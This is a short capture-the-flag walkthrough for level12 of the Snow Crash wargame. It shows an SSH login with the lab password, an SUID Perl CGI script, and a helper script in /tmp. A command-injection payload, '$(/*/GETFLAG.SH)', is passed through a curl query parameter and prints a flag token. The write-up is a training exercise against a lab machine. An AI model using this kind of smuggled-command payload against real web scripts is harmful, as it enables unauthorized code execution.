Login as `level12`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level12
level12@192.168.1.64's password: fa6v5ateaw21peobuub8ipe6s
```
An `SUID` Perl script is located in home directory.
```shell
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ ./level12.pl
Content-type: text/html

..
```
Script execute a substitution command.
```shell
level12@SnowCrash:~$ vi /tmp/GETFLAG.SH
#!/bin/bash
/bin/getflag > /tmp/flag12
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG.SH
```
Then, wildcard `*` can be used to search and execute all files `GETFLAG.SH` across all directory.
What is expected as soon as 
```
`egrep "^$xx" /tmp/xd 2>&1`
`egrep "^$(/*/GETFLAG.SH)" /tmp/xd 2>&1`
```
```shell
level12@SnowCrash:~$ curl  'http://127.0.0.1:4646/?x=$(/*/GETFLAG.SH)'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
